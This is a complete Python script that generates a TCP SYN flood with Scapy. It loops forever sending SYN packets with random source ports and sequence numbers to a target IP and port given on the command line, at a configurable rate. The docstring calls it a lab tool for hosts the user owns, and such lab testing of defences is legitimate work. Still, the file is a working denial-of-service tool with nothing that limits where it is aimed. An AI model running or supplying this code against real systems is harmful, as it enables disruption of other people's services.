#!/usr/bin/env python3
"""
SYN flood generator for lab testing (requires admin + Scapy + Npcap).

Targets a host you own. Example:

  python scripts/sim_syn_flood.py 192.168.56.101 80

Stop with Ctrl+C.
"""
import argparse
import random
import sys
import time

try:
    from scapy.all import IP, TCP, send
except ImportError:
    print("Scapy required")
    sys.exit(1)


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("target")
    ap.add_argument("dport", type=int, nargs="?", default=80)
    ap.add_argument("--rate", type=float, default=200.0, help="packets/sec target (approx)")
    args = ap.parse_args()

    interval = 1.0 / max(args.rate, 1.0)
    print(f"flooding {args.target}:{args.dport} ~{args.rate} syn/s")
    i = 0
    while True:
        sport = random.randint(1024, 65535)
        pkt = IP(dst=args.target) / TCP(
            sport=sport, dport=args.dport, flags="S", seq=random.randint(0, 0xFFFFFFFF)
        )
        send(pkt, verbose=0)
        i += 1
        if i % 100 == 0:
            print(f"  sent {i} SYN…", flush=True)
        time.sleep(interval)


if __name__ == "__main__":
    main()
